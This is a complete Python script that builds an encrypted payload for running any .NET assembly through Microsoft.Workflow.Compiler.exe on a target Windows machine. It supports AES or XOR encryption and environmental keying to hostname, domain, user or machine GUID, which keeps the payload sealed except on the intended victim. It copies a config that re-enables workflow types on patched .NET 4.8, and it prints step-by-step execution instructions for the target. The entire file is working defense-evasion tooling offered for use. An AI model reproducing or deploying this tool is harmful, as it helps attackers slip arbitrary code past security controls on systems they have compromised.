#!/usr/bin/env python3
"""
build_workflow.py -- Encrypts a .NET assembly and injects into workflow_payload.cs

Generates three files for Microsoft.Workflow.Compiler.exe:
  - workflow_ready.cs    (C# with encrypted payload in static constructor)
  - workflow_ready.xoml  (minimal XOML referencing the class)
  - workflow_input.xml   (CompilerInput pointing to both files)

Usage:
  python build_workflow.py <assembly_path> [options] [-- <assembly_args>...]

Examples:
  python build_workflow.py Seatbelt.exe -- -group=all
  python build_workflow.py Seatbelt.exe -e xor -- -group=all
  python build_workflow.py Seatbelt.exe --keying hostname=WS01,domain=CORP -- -group=all
  python build_workflow.py MyLib.dll --type Namespace.Class --method Run

On target:
  C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Microsoft.Workflow.Compiler.exe workflow_input.xml out.log
"""

import argparse
import base64
import hashlib
import os
import sys

KEYING_PROPERTIES = ("hostname", "domain", "user", "machineguid")


def xor_encrypt(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))


def aes_encrypt(data: bytes, key: bytes, iv: bytes) -> bytes:
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.primitives import padding
    except ImportError:
        print("[-] AES encryption requires the 'cryptography' package.", file=sys.stderr)
        print("    Install with: pip install cryptography", file=sys.stderr)
        print("    Or use -e xor for XOR encryption (no dependencies).", file=sys.stderr)
        sys.exit(1)

    padder = padding.PKCS7(128).padder()
    padded = padder.update(data) + padder.finalize()

    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
    encryptor = cipher.encryptor()
    return encryptor.update(padded) + encryptor.finalize()


def parse_keying(spec: str) -> dict:
    result = {}
    for pair in spec.split(","):
        pair = pair.strip()
        if "=" not in pair:
            print(f"[-] Invalid keying spec: {pair} (expected name=value)", file=sys.stderr)
            sys.exit(1)
        name, value = pair.split("=", 1)
        name = name.strip().lower()
        if name not in KEYING_PROPERTIES:
            print(f"[-] Unknown keying property: {name}", file=sys.stderr)
            print(f"    Valid: {', '.join(KEYING_PROPERTIES)}", file=sys.stderr)
            sys.exit(1)
        result[name] = value.strip()
    return result


def derive_key(salt: bytes, keying: dict) -> bytes:
    parts = []
    for name in sorted(keying.keys()):
        parts.append(f"{name}={keying[name].upper()}\n")
    keying_str = "".join(parts)
    return hashlib.sha256(salt + keying_str.encode("utf-8")).digest()


def patch_template_for_xor(template: str) -> str:
    aes_method = (
        "    static byte[] AesDecrypt(byte[] data, byte[] key, byte[] iv)\n"
        "    {\n"
        "        using (RijndaelManaged aes = new RijndaelManaged())\n"
        "        {\n"
        "            aes.Key = key;\n"
        "            aes.IV = iv;\n"
        "            aes.Mode = CipherMode.CBC;\n"
        "            aes.Padding = PaddingMode.PKCS7;\n"
        "            ICryptoTransform decryptor = aes.CreateDecryptor();\n"
        "            return decryptor.TransformFinalBlock(data, 0, data.Length);\n"
        "        }\n"
        "    }"
    )

    xor_method = (
        "    static byte[] XorDecrypt(byte[] data, byte[] key)\n"
        "    {\n"
        "        byte[] result = new byte[data.Length];\n"
        "        for (int i = 0; i < data.Length; i++)\n"
        "            result[i] = (byte)(data[i] ^ key[i % key.Length]);\n"
        "        return result;\n"
        "    }"
    )

    template = template.replace(aes_method, xor_method)

    template = template.replace(
        '    static string IV_B64 = "YOURIVHERE";\n', ""
    )
    template = template.replace(
        '    static string KEYING = "YOURKEYINGHERE";\n', ""
    )
    template = template.replace(
        '    static string SALT_B64 = "YOURSALTHERE";\n', ""
    )

    derive_start = "    static byte[] DeriveKey(string saltB64, string keying)\n    {"
    derive_end = "    }\n\n    static string ENCRYPTED_B64"
    if derive_start in template:
        idx_start = template.index(derive_start)
        idx_end = template.index(derive_end)
        template = template[:idx_start] + "    static string ENCRYPTED_B64" + template[idx_end + len(derive_end):]

    template = template.replace("using System.Security.Cryptography;\n", "")
    template = template.replace("using System.Text;\n", "")

    template = template.replace(
        "            byte[] key;\n"
        "            if (KEYING.Length > 0)\n"
        "                key = DeriveKey(SALT_B64, KEYING);\n"
        "            else\n"
        "                key = Convert.FromBase64String(KEY_B64);\n"
        "            byte[] iv = Convert.FromBase64String(IV_B64);\n"
        "\n"
        "            byte[] clearAssembly;\n"
        "            try\n"
        "            {\n"
        "                clearAssembly = AesDecrypt(encrypted, key, iv);\n"
        "            }\n"
        "            catch (CryptographicException)\n"
        "            {\n"
        '                Console.Error.WriteLine("Decryption failed -- key mismatch (wrong target?)");\n'
        "                return;\n"
        "            }\n"
        "\n"
        "            Array.Clear(encrypted, 0, encrypted.Length);\n"
        "            Array.Clear(key, 0, key.Length);\n"
        "            Array.Clear(iv, 0, iv.Length);",
        "            byte[] key = Convert.FromBase64String(KEY_B64);\n"
        "            byte[] clearAssembly = XorDecrypt(encrypted, key);\n"
        "\n"
        "            Array.Clear(encrypted, 0, encrypted.Length);\n"
        "            Array.Clear(key, 0, key.Length);",
    )

    return template


def main():
    argv = sys.argv[1:]
    assembly_args = []
    if "--" in argv:
        split_idx = argv.index("--")
        assembly_args = argv[split_idx + 1:]
        argv = argv[:split_idx]

    parser = argparse.ArgumentParser(
        description="Encrypt a .NET assembly and inject into workflow compiler payload"
    )
    parser.add_argument("assembly", help="Path to .NET assembly (.exe or .dll)")
    parser.add_argument(
        "-e", "--encryption", choices=["aes", "xor"], default="aes",
        help="Encryption method: aes (AES-256-CBC, default) or xor"
    )
    parser.add_argument("--key", help="Encryption key as hex")
    parser.add_argument("--iv", help="AES IV as hex (16 bytes / 32 hex chars)")
    parser.add_argument(
        "--keying",
        help="Environmental keying: name=value,name=value. "
             "Properties: hostname, domain, user, machineguid."
    )
    parser.add_argument("--type", help="Type name for DLL invocation")
    parser.add_argument("--method", help="Method name for DLL invocation")
    parser.add_argument("-o", "--output-dir",
                        help="Output directory (default: script directory)")
    parser.add_argument("--template", help="Template .cs file to use")
    args = parser.parse_args(argv)

    if (args.type is None) != (args.method is None):
        print("[-] --type and --method must be specified together.", file=sys.stderr)
        sys.exit(1)
    if args.keying and args.encryption == "xor":
        print("[-] --keying requires AES encryption.", file=sys.stderr)
        sys.exit(1)
    if args.keying and args.key:
        print("[-] --keying and --key are mutually exclusive.", file=sys.stderr)
        sys.exit(1)

    script_dir = os.path.dirname(os.path.abspath(__file__))
    template_cs_path = args.template or os.path.join(script_dir, "workflow_payload.cs")
    template_xoml_path = os.path.join(script_dir, "workflow_payload.xoml")
    template_xml_path = os.path.join(script_dir, "workflow_input.xml")
    config_path = os.path.join(script_dir, "workflow_compiler.exe.config")
    output_dir = args.output_dir or os.path.join(script_dir, "output")
    os.makedirs(output_dir, exist_ok=True)

    output_cs = os.path.join(output_dir, "workflow_ready.cs")
    output_xoml = os.path.join(output_dir, "workflow_ready.xoml")
    output_xml = os.path.join(output_dir, "workflow_input_ready.xml")
    output_config = os.path.join(output_dir, "Microsoft.Workflow.Compiler.exe.config")

    if not os.path.exists(args.assembly):
        print(f"[-] Assembly not found: {args.assembly}", file=sys.stderr)
        sys.exit(1)
    for p in (template_cs_path, template_xoml_path, template_xml_path):
        if not os.path.exists(p):
            print(f"[-] Template not found: {p}", file=sys.stderr)
            sys.exit(1)

    with open(args.assembly, "rb") as f:
        assembly_bytes = f.read()
    print(f"[*] Assembly: {args.assembly} ({len(assembly_bytes)} bytes)", file=sys.stderr)

    with open(template_cs_path, "r") as f:
        template = f.read()

    # --- Encryption ---

    if args.encryption == "xor":
        if args.key:
            key = bytes.fromhex(args.key)
        else:
            key = os.urandom(16)

        print(f"[*] Mode: XOR", file=sys.stderr)
        print(f"[*] XOR key: {key.hex()}", file=sys.stderr)

        encrypted = xor_encrypt(assembly_bytes, key)
        template = patch_template_for_xor(template)

        encrypted_b64 = base64.b64encode(encrypted).decode("ascii")
        key_b64 = base64.b64encode(key).decode("ascii")

        template = template.replace('"YOURPAYLOADHERE"', f'"{encrypted_b64}"')
        template = template.replace('"YOURKEYHERE"', f'"{key_b64}"')

    elif args.keying:
        keying = parse_keying(args.keying)
        salt = os.urandom(16)
        key = derive_key(salt, keying)

        if args.iv:
            iv = bytes.fromhex(args.iv)
        else:
            iv = os.urandom(16)

        keying_names = ",".join(sorted(keying.keys()))

        print(f"[*] Mode: AES-256-CBC + environmental keying", file=sys.stderr)
        print(f"[*] Keying: {keying_names}", file=sys.stderr)
        for name in sorted(keying.keys()):
            print(f"[*]   {name} = {keying[name]}", file=sys.stderr)
        print(f"[*] Salt:    {salt.hex()}", file=sys.stderr)
        print(f"[*] Derived: {key.hex()}", file=sys.stderr)
        print(f"[*] AES IV:  {iv.hex()}", file=sys.stderr)

        encrypted = aes_encrypt(assembly_bytes, key, iv)
        encrypted_b64 = base64.b64encode(encrypted).decode("ascii")
        salt_b64 = base64.b64encode(salt).decode("ascii")
        iv_b64 = base64.b64encode(iv).decode("ascii")

        template = template.replace('"YOURPAYLOADHERE"', f'"{encrypted_b64}"')
        template = template.replace('"YOURKEYHERE"', '""')
        template = template.replace('"YOURIVHERE"', f'"{iv_b64}"')
        template = template.replace('"YOURKEYINGHERE"', f'"{keying_names}"')
        template = template.replace('"YOURSALTHERE"', f'"{salt_b64}"')

    else:
        if args.key:
            key = bytes.fromhex(args.key)
            if len(key) != 32:
                print(f"[-] AES-256 key must be 32 bytes, got {len(key)}", file=sys.stderr)
                sys.exit(1)
        else:
            key = os.urandom(32)

        if args.iv:
            iv = bytes.fromhex(args.iv)
            if len(iv) != 16:
                print(f"[-] AES IV must be 16 bytes, got {len(iv)}", file=sys.stderr)
                sys.exit(1)
        else:
            iv = os.urandom(16)

        print(f"[*] Mode: AES-256-CBC", file=sys.stderr)
        print(f"[*] AES key: {key.hex()}", file=sys.stderr)
        print(f"[*] AES IV:  {iv.hex()}", file=sys.stderr)

        encrypted = aes_encrypt(assembly_bytes, key, iv)
        encrypted_b64 = base64.b64encode(encrypted).decode("ascii")
        key_b64 = base64.b64encode(key).decode("ascii")
        iv_b64 = base64.b64encode(iv).decode("ascii")

        template = template.replace('"YOURPAYLOADHERE"', f'"{encrypted_b64}"')
        template = template.replace('"YOURKEYHERE"', f'"{key_b64}"')
        template = template.replace('"YOURIVHERE"', f'"{iv_b64}"')
        template = template.replace('"YOURKEYINGHERE"', '""')
        template = template.replace('"YOURSALTHERE"', '""')

    print(f"[*] Encrypted payload: {len(base64.b64encode(encrypted).decode())} chars base64",
          file=sys.stderr)

    # --- Invocation target ---

    if args.type and args.method:
        template = template.replace('"YOURTYPEHERE"', f'"{args.type}"')
        template = template.replace('"YOURMETHODHERE"', f'"{args.method}"')
        print(f"[*] Target: {args.type}.{args.method}()", file=sys.stderr)
    else:
        template = template.replace('"YOURTYPEHERE"', '""')
        template = template.replace('"YOURMETHODHERE"', '""')
        print(f"[*] Target: EntryPoint (auto)", file=sys.stderr)

    # --- Assembly args ---

    if assembly_args:
        args_lines = []
        for arg in assembly_args:
            escaped = arg.replace("\\", "\\\\").replace('"', '\\"')
            args_lines.append(f'        "{escaped}",')
        args_str = "\n".join(args_lines)
        template = template.replace("        // YOURARGS", args_str)

    # --- Write C# file ---

    with open(output_cs, "w") as f:
        f.write(template)
    print(f"[+] Written: {output_cs}", file=sys.stderr)

    # --- Write XOML (copy as-is) ---

    with open(template_xoml_path, "r") as f:
        xoml = f.read()
    with open(output_xoml, "w") as f:
        f.write(xoml)
    print(f"[+] Written: {output_xoml}", file=sys.stderr)

    # --- Write input XML with correct filenames ---

    with open(template_xml_path, "r") as f:
        input_xml = f.read()

    input_xml = input_xml.replace("YOURXOMLHERE", os.path.basename(output_xoml))
    input_xml = input_xml.replace("YOURCSHERE", os.path.basename(output_cs))

    with open(output_xml, "w") as f:
        f.write(input_xml)
    print(f"[+] Written: {output_xml}", file=sys.stderr)

    # --- Write config file (authorizes workflow types on patched .NET 4.8) ---

    import shutil
    if os.path.exists(config_path):
        shutil.copy2(config_path, output_config)
        print(f"[+] Written: {output_config}", file=sys.stderr)

    print(f"[*] Transfer all files to the same directory on target:", file=sys.stderr)
    print(f"    {os.path.basename(output_cs)}", file=sys.stderr)
    print(f"    {os.path.basename(output_xoml)}", file=sys.stderr)
    print(f"    {os.path.basename(output_xml)}", file=sys.stderr)
    print(f"    {os.path.basename(output_config)}", file=sys.stderr)
    print(f"[*] On target:", file=sys.stderr)
    print(f"    1. Copy compiler to working dir:", file=sys.stderr)
    print(f"       copy C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\"
          f"Microsoft.Workflow.Compiler.exe .", file=sys.stderr)
    print(f"    2. Run:", file=sys.stderr)
    print(f"       .\\Microsoft.Workflow.Compiler.exe {os.path.basename(output_xml)} out.log",
          file=sys.stderr)


if __name__ == "__main__":
    main()
